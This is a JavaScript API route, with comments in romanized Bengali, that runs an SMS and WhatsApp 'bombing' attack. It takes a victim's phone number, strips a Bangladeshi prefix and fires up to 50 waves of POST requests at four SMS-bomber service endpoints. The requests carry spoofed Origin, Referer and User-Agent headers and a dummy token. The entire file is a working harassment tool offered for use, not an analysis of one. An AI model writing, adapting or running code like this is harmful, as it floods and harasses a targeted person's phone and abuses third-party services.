// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Shudhu digits rakhbe)
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) {
    cleanNumber = cleanNumber.substring(2); 
  }

  // 2. Target Endpoints (Amra multiple possible API paths try korbo)
  // Eita holo ashol technique jekhane amra direct API hit korbo
  const targetEndpoints = [
    'https://nuke-sms-bomber.pages.dev/api/attack',
    'https://shadowx-sms-bomber.onrender.com/api/send',
    'https://nuke-sms-bomber.pages.dev/api/v1/send',
    'https://shadowx-sms-bomber.onrender.com/api/v1/attack'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 50 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetEndpoints.map(async (endpoint) => {
        try {
          // Amra ekhane ekta "Heavy Payload" pathacchi jeta sob parameter cover korbe
          const response = await fetch(endpoint, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'Origin': 'https://nuke-sms-bomber.pages.dev',
              'Referer': 'https://nuke-sms-bomber.pages.dev/',
              'X-Requested-With': 'XMLHttpRequest',
            },
            body: JSON.stringify({
              number: cleanNumber,
              phone: cleanNumber,
              target: cleanNumber,
              mobile: cleanNumber,
              amount: 1,
              count: 1,
              qty: 1,
              country: "BD",
              service: "whatsapp",
              msg: "Ultimate Attack",
              auth: "true",
              token: "dummy_token_123",
              is_active: true
            }),
            mode: 'cors'
          });

          console.log(`[Wave ${i}] Endpoint: ${endpoint} | Status: ${response.status}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
